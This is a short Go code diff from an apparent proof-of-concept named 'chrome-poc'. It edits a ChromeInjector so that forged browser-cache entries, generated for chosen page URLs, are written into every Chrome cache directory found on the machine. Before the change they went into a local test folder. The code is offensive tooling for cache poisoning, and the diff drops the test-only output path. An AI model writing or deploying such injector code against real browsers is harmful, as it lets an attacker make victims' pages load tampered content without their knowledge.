@@ -4,6 +4,9 @@ import (
 	"fmt"
 	"net/url"
 	"io/ioutil"
+	"path/filepath"
+
+	"chrome-poc/injector/platform"
 )
 
 type ChromeInjector struct {
@@ -13,11 +16,19 @@ type ChromeInjector struct {
 }
 
 func (self *ChromeInjector) Inject() {
+	cacheDirs := platform.CacheDirs()
+
+	fmt.Printf("Found cache dirs: %v\n", cacheDirs)
+
 	for _, pageUrl := range self.PageUrls {
-		// TODO: remove test file
 		filename, fileData := self.generatePayload(pageUrl)
-		path := fmt.Sprintf("./test-files/%s", filename)
-		ioutil.WriteFile(path, fileData, 0644)
+
+		for _, dirPath := range cacheDirs {
+			path := filepath.Join(dirPath, filename)
+			fmt.Printf("  Writing to '%v'\n", path)
+
+			ioutil.WriteFile(path, fileData, 0644)
+		}
 	}
 }
 
@@ -47,7 +58,7 @@ func (self *ChromeInjector) generatePayload(urlStr string) (string, []byte) {
 	fileData = append(fileData, respInfoData...)
 	fileData = append(fileData, metadataHash(cacheKey)...)
 	fileData = append(fileData, fileEofData(respInfoData, 0)...)
-	
+
 	return filename, fileData
 }
 
